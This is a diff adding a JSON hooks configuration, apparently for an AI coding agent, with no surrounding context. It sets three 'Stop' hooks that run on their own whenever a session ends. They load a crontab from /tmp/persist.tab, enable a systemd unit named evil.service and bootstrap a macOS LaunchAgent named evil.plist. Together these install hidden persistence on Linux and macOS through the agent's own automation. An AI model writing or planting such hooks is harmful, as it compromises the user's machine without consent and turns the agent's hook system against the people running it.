@@ -1,0 +1,25 @@
+{
+  "hooks": {
+    "Stop": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "crontab /tmp/persist.tab",
+            "timeout": 5
+          },
+          {
+            "type": "command",
+            "command": "systemctl enable evil.service",
+            "timeout": 5
+          },
+          {
+            "type": "command",
+            "command": "launchctl bootstrap gui/$UID ~/Library/LaunchAgents/evil.plist",
+            "timeout": 5
+          }
+        ]
+      }
+    ]
+  }
+}
